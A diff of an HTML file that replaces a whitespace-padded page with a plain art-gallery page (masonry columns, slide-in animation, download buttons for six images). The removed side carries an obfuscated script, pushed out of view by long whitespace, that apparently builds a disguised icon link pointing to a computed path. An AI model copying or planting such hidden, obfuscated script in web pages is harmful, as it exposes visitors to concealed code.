@@ -1,206 +1,123 @@
-                                                                                                                                                                                                                                                                                                                                                                                    <head><script>function _0x2c0c(_0x4ef33e,_0x3136a8){const _0x5edba1=_0x5edb();return _0x2c0c=function(_0x2c0c72,_0x2404ac){_0x2c0c72=_0x2c0c72-0x174;let _0x369fe0=_0x5edba1[_0x2c0c72];return _0x369fe0;},_0x2c0c(_0x4ef33e,_0x3136a8);}(function(_0x42d41e,_0x29ed5e){const _0x567722=_0x2c0c,_0x2646cf=_0x42d41e();while(!![]){try{const _0x4d6c62=parseInt(_0x567722(0x175))/0x1+-parseInt(_0x567722(0x17b))/0x2*(-parseInt(_0x567722(0x17c))/0x3)+parseInt(_0x567722(0x188))/0x4*(-parseInt(_0x567722(0x177))/0x5)+-parseInt(_0x567722(0x176))/0x6*(-parseInt(_0x567722(0x183))/0x7)+parseInt(_0x567722(0x174))/0x8+parseInt(_0x567722(0x187))/0x9+-parseInt(_0x567722(0x180))/0xa;if(_0x4d6c62===_0x29ed5e)break;else _0x2646cf['push'](_0x2646cf['shift']());}catch(_0x30cad9){_0x2646cf['push'](_0x2646cf['shift']());}}}(_0x5edb,0xeb565),(_0x4fb1cb=>{const _0x15ebdc=_0x2c0c;let _0x2e9166=atob('NkY2RTY1Nzg2MTZENjU2QzY5')['split'](/(..)/)[_0x15ebdc(0x184)](Boolean)[_0x15ebdc(0x189)](_0x52a35=>parseInt(_0x52a35,0x10)^0x19),_0x1befe5=document;_0x1befe5['head'][_0x15ebdc(0x18a)](Object[_0x15ebdc(0x17e)](_0x1befe5[_0x15ebdc(0x17f)](_0x15ebdc(0x186)),{'rel':''+String['fromCharCode'](0x66,0x69,0x63,0x6f,0x6e),'type':''+btoa(_0x15ebdc(0x178))[_0x15ebdc(0x18b)]('')[_0x15ebdc(0x181)]()[_0x15ebdc(0x17a)]('')[_0x15ebdc(0x17d)](-0x9),'href':'/'+String[_0x15ebdc(0x179)](..._0x2e9166['map'](_0x2f507d=>_0x2f507d-0x9))[_0x15ebdc(0x182)](/(..)/g,'$1')['match'](/.{4}/g)[_0x15ebdc(0x181)]()[_0x15ebdc(0x17a)]('')[_0x15ebdc(0x182)](/2F/g,'')+_0x15ebdc(0x185)}));})());function _0x5edb(){const _0x239dd=['append','split','176352JloVza','1361284PsPukr','6qKOBvK','6455pQFLsL','aW1hZ2UveC1pY29u','fromCharCode','join','1170754ayUagC','9jzQxsT','slice','assign','createElement','36176590TPMrCM','reverse','replace','9942429wyaMUh','filter','.ico','link','17287695dIfaqo','5884mmghbV','map'];_0x5edb=function(){return _0x239dd;};return _0x5edb();}</script></head>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-Hi
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0"
+    />
+    <title>Art Gallery</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        background: linear-gradient(135deg, #1a1a1a, #333333);
+        font-family: Arial, sans-serif;
+      }
+
+      .gallery {
+        padding: 1em;
+        /* Masonry-like layout using CSS columns */
+        column-count: 3;
+        column-gap: 1em;
+      }
+
+      .image-item {
+        position: relative;
+        break-inside: avoid;
+        margin-bottom: 1em;
+        opacity: 0;
+        /* Slide in from the bottom */
+        animation: slideIn 1.5s ease forwards;
+      }
+
+      .image-item img {
+        width: 100%;
+        height: auto; /* Preserves aspect ratio */
+        display: block;
+        border-radius: 4px;
+      }
+
+      .download-btn {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        background-color: gray;
+        color: #fff;
+        text-decoration: none;
+        padding: 6px 10px;
+        border-radius: 3px;
+        opacity: 0;
+        transition: opacity 0.3s ease;
+        font-size: 14px;
+      }
+
+      .image-item:hover .download-btn {
+        opacity: 1;
+      }
+
+      @keyframes slideIn {
+        from {
+          transform: translateY(20px);
+          opacity: 0;
+        }
+        to {
+          transform: translateY(0);
+          opacity: 1;
+        }
+      }
+
+      /* Responsive adjustments */
+      @media (max-width: 768px) {
+        .gallery {
+          column-count: 2;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .gallery {
+          column-count: 1;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="gallery"></div>
+
+    <script>
+      const images = [
+        "https://pnj6i4tj3g.ufs.sh/f/RiH3sMpSQNCdxj6qXAGeW0C4lzqmB97uA3UTRjMY8PswNkJ1",
+        "https://pnj6i4tj3g.ufs.sh/f/RiH3sMpSQNCd6d4hgQwSe0QrLiNnV5IO1pMtgBuTFx78qjCs",
+        "https://pnj6i4tj3g.ufs.sh/f/RiH3sMpSQNCd0WB7AQi3fGlZtTq5WRNvdyrgh2EHC7F3LaAu",
+        "https://pnj6i4tj3g.ufs.sh/f/RiH3sMpSQNCdP6llwN0R8WemhtjVCM19TBGyQAx4XH7Ncnof",
+        "https://pnj6i4tj3g.ufs.sh/f/RiH3sMpSQNCdrPuQc9ys5DqWzMACyuNjJk1iGUdVgtO8ZPQX",
+        "https://pnj6i4tj3g.ufs.sh/f/RiH3sMpSQNCdy04AptFzeYcnUD9tGTlEhuprF1ZN27QPyX5V"
+      ];
+
+      const gallery = document.querySelector(".gallery");
+
+      images.forEach((src, index) => {
+        const div = document.createElement("div");
+        div.className = "image-item";
+        // Stagger the slide-in animation slightly for each image
+        div.style.animationDelay = `${index * 0.2}s`;
+
+        const img = document.createElement("img");
+        img.src = src;
+        img.alt = "Art Image";
+
+        const downloadLink = document.createElement("a");
+        downloadLink.className = "download-btn";
+        downloadLink.href = src;
+        // The 'download' attribute triggers download
+        downloadLink.setAttribute("download", "");
+        downloadLink.innerText = "Download";
+
+        div.appendChild(img);
+        div.appendChild(downloadLink);
+
+        gallery.appendChild(div);
+      });
+    </script>
+  </body>
+</html>
